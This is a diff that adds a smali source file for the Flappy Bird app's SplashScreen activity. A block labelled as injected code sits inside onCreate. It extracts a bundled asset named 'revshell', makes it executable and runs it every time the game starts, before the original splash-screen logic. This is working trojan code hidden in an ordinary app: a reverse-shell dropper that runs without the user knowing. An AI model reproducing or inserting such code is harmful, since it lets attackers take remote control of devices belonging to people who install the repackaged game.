@@ -1,0 +1,142 @@
+
+.class public Lcom/dotgears/flappy/SplashScreen;
+.super Landroid/app/Activity;
+
+
+# static fields
+.field private static a:I
+
+
+# direct methods
+.method static constructor <clinit>()V
+    .locals 1
+
+    const/16 v0, 0x7d0
+
+    sput v0, Lcom/dotgears/flappy/SplashScreen;->a:I
+
+    return-void
+.end method
+
+.method public constructor <init>()V
+    .locals 0
+
+    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method protected onCreate(Landroid/os/Bundle;)V
+    .registers 18 # v0-v15 for locals, v16 for p0 (this), v17 for p1 (Bundle)
+
+    # invoke-super {p0, p1} ... (p0=v16, p1=v17)
+    invoke-super/range {v16 .. v17}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+
+    # --- START OF INJECTED CODE ---
+    .prologue
+
+    const-string v5, "revshell"
+    const-string v6, "/"
+
+    :try_start_inject
+    # Get AssetManager: assetManager = this.getAssets(); (this = v16)
+    invoke-virtual/range {v16 .. v16}, Lcom/dotgears/flappy/SplashScreen;->getAssets()Landroid/content/res/AssetManager;
+    move-result-object v4 # v4 = assetManager
+
+    # Open InputStream to asset: in = assetManager.open(binaryName);
+    invoke-virtual {v4, v5}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
+    move-result-object v7 # v7 = InputStream in
+
+    # Construct internal path: String internalPath = this.getFilesDir().getAbsolutePath() + "/" + binaryName;
+    # Get File object for files dir: filesDirFileObj = this.getFilesDir(); (this = v16)
+    invoke-virtual/range {v16 .. v16}, Lcom/dotgears/flappy/SplashScreen;->getFilesDir()Ljava/io/File;
+    move-result-object v8 # v8 = filesDirFileObj
+
+    invoke-virtual {v8}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
+    move-result-object v9 # v9 = filesDirPathStr
+
+    new-instance v10, Ljava/lang/StringBuilder;
+    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V
+    invoke-virtual {v10, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v10, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v11 # v11 = internalPath
+
+    new-instance v12, Ljava/io/FileOutputStream;
+    invoke-direct {v12, v11}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V
+
+    const/16 v13, 0x400
+    new-array v14, v13, [B
+
+    :read_loop
+    invoke-virtual {v7, v14}, Ljava/io/InputStream;->read([B)I
+    move-result v15
+    const/4 v0, -0x1
+    if-eq v15, v0, :copy_done
+    const/4 v0, 0x0
+    invoke-virtual {v12, v14, v0, v15}, Ljava/io/OutputStream;->write([BII)V
+    goto :read_loop
+
+    :copy_done
+    invoke-virtual {v7}, Ljava/io/InputStream;->close()V
+    invoke-virtual {v12}, Ljava/io/OutputStream;->flush()V
+    invoke-virtual {v12}, Ljava/io/OutputStream;->close()V
+
+    new-instance v4, Ljava/io/File; # Reusing v4
+    invoke-direct {v4, v11}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+    const/4 v0, 0x1
+    const/4 v1, 0x0
+    invoke-virtual {v4, v0, v1}, Ljava/io/File;->setExecutable(ZZ)Z
+
+    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
+    move-result-object v4 # Reusing v4
+    invoke-virtual {v4, v11}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
+
+    const-string v0, "InjectionDebug"
+    const-string v1, "Custom binary executed (or attempted)."
+    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    goto :skip_catch_inject
+    :try_end_inject
+    .catch Ljava/io/IOException; {:try_start_inject .. :try_end_inject} :catch_handler_inject
+
+    :catch_handler_inject
+    move-exception v4 # v4 holds the exception
+    const-string v0, "InjectionError"
+    invoke-virtual {v4}, Ljava/io/IOException;->getMessage()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
+
+    :skip_catch_inject
+    # --- END OF INJECTED CODE ---
+
+    # --- ORIGINAL onCreate CODE ---
+    const/high16 v0, 0x7f030000 # layout ID loaded into v0
+
+    # Prepare for setContentView(I)
+    # move-object v2, v16  <-- OLD (Error for v16 as source)
+    move-object/from16 v2, v16  # v2 = this (SplashScreen) from v16
+    move v3, v0                 # v3 = layoutId (from original v0)
+    invoke-virtual/range {v2 .. v3}, Lcom/dotgears/flappy/SplashScreen;->setContentView(I)V
+
+    new-instance v0, Landroid/os/Handler; # v0 is now Handler
+    invoke-direct {v0}, Landroid/os/Handler;-><init>()V
+
+    new-instance v1, Lcom/dotgears/flappy/d; # v1 is the new Runnable object
+
+    # Prepare for com.dotgears.flappy.d constructor <init>(Lcom/dotgears/flappy/SplashScreen;)
+    move-object v2, v1          # v2 = this (the new 'd' object, v1 is low-register so simple move-object is fine)
+    # move-object v3, v16  <-- OLD (Error for v16 as source)
+    move-object/from16 v3, v16  # v3 = SplashScreen argument from v16
+    invoke-direct/range {v2 .. v3}, Lcom/dotgears/flappy/d;-><init>(Lcom/dotgears/flappy/SplashScreen;)V
+
+    sget v2, Lcom/dotgears/flappy/SplashScreen;->a:I # v2 gets static field value
+    int-to-long v2, v2                              # long value in v2, v3
+
+    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
+
+    return-void
+.end method
